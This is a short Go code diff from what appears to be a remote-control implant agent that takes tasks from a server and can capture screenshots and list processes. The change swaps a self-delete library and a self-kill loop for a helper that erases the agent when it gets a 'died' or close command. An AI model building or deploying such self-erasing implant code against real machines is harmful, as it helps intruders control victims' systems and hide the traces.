@@ -20,7 +20,6 @@ import (
 	"text/tabwriter"
 	"time"
 
-	selfdelete "github.com/secur30nly/go-self-delete"
 	"github.com/shirou/gopsutil/v3/process"
 	"github.com/vova616/screenshot"
 )
@@ -322,15 +321,8 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			// kill current process
 			go func() {
 				if doClose == "true" {
-					var ctx context.Context
-					procsWithCtx, _ := process.ProcessesWithContext(ctx)
-
-					for _, proc := range procsWithCtx {
-						if fmt.Sprint(proc.Pid) == fmt.Sprint(hg.GetCurrentPid()) {
-							time.Sleep(5 * time.Second)
-							proc.KillWithContext(ctx)
-						}
-					}
+					hg.Suicide()
+					os.Exit(1)
 				}
 			}()
 
@@ -382,7 +374,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 		// kill self if die command used
 		if data == "died" {
-			selfdelete.SelfDeleteExe()
+			hg.Suicide()
 			os.Exit(2)
 		}
 	}
